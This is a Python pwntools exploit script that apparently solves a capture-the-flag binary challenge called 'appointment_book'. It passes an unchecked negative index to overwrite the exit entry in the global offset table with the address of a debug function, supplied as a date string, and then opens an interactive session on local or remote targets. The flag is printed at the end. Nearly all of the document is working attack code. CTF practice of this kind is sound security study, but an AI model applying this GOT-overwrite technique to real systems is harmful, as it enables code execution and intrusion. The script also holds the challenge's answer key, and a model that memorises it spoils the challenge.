#!/usr/bin/env python3

from pwn import *
import datetime

p64 = lambda x: util.packing.p64(x, endian='little')
u64 = lambda x: util.packing.u64(x, endian='little')
p32 = lambda x: util.packing.p32(x, endian='little')
u32 = lambda x: util.packing.u32(x, endian='little')

exe = ELF("./appointment_book_patched")

context.binary = exe
context.terminal = ['tmux', 'splitw', '-h', '-F' '#{pane_pid}', '-P']


def conn():
	if args.LOCAL:
		r = process([exe.path])
	elif args.REMOTE:
		r = remote("static-03.herocft.fr", 5000)
	else:
		r = gdb.debug([exe.path])
	return r


def main():
	r = conn()

	debug_remote = exe.symbols['debug_remote']
	exit_got_index = -5

	date = datetime.datetime.fromtimestamp(debug_remote)
	success(f'{date=}')

	r.sendlineafter(b'choice: ', b'2')
	r.sendlineafter(b'(0-7)', str(exit_got_index).encode())
	r.sendlineafter(b'SS): ', str(date).encode())
	r.sendlineafter(b'...):', b'pwned')
	r.sendlineafter(b'choice: ', b'3')

	r.interactive()


if __name__ == "__main__":
	main()

# Hero{Unch3ck3d_n3g4t1v3_1nd3x_1nt0_G0T_0v3wr1t3_g03s_brrrrrr}
